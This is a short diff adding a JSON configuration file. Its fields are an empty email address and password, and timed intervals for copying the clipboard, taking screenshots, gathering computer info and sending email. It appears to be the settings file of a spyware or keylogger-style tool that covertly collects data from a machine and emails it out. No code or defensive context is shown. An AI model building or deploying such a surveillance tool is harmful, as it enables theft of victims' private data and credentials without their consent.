@@ -1,0 +1,8 @@
+{
+  "email_address": "",
+  "password": "",
+  "copy_clipboard_interval": 10,
+  "send_email_interval": 30,
+  "screenshot_interval": 30,
+  "computer_info_interval": 30
+}
